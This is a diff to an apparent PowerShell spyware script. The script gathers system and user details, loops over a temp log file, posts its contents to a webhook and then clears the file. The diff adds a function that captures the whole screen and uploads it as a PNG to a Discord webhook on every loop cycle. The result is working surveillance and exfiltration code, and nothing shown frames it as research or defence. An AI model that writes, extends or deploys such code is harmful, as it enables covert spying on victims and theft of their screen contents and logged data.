@@ -68,6 +68,49 @@ $cpuInfo = Get-WmiObject -Class Win32_Processor
 $userInfo = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
 $hostname = $env:COMPUTERNAME
 
+# Function to take screenshot and send it to Discord
+function Send-ScreenshotToWebhook {
+    # Load necessary assemblies
+    Add-Type -AssemblyName "System.Windows.Forms"
+    Add-Type -AssemblyName "System.Drawing"
+
+    # Accessing the VirtualScreen property
+    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+    $Width = $Screen.Width
+    $Height = $Screen.Height
+    $Left = $Screen.Left
+    $Top = $Screen.Top
+
+    # Capture the screen
+    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
+    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
+    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
+
+    # Convert the bitmap to a memory stream to send as a file
+    $memoryStream = New-Object System.IO.MemoryStream
+    $bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Png)
+    $memoryStream.Seek(0, [System.IO.SeekOrigin]::Begin)  # Reset stream position to the beginning
+
+    # Create multipart form data for the POST request
+    $formData = @{
+        file1 = New-Object System.Net.Http.MultipartFormDataContent
+    }
+
+    $fileContent = New-Object System.Net.Http.ByteArrayContent($memoryStream.ToArray())
+    $fileContent.Headers.ContentType = "image/png"
+    $formData['file1'] = $fileContent
+
+    # Send to Discord webhook
+    try {
+        $response = Invoke-RestMethod -Uri $webhookURL -Method Post -ContentType 'multipart/form-data' -Body $formData
+        Write-Host "Screenshot sent successfully!" -ForegroundColor Green
+    }
+    catch {
+        Write-Host "Error while sending screenshot:" -ForegroundColor Red
+        Write-Host $_.Exception.Message
+    }
+}
+
 # Start an infinite loop to check the file every 5 seconds
 while ($true) {
     # Pause for 10 seconds before checking
@@ -103,6 +146,9 @@ while ($true) {
                 Write-Host "Error while sending message to webhook:" -ForegroundColor Red
                 Write-Host $_.Exception.Message
             }
+
+            # Send the screenshot to Discord webhook
+            Send-ScreenshotToWebhook
 
             # Clear the content of the temp log file after sending the data
             Clear-Content $tempFilePath
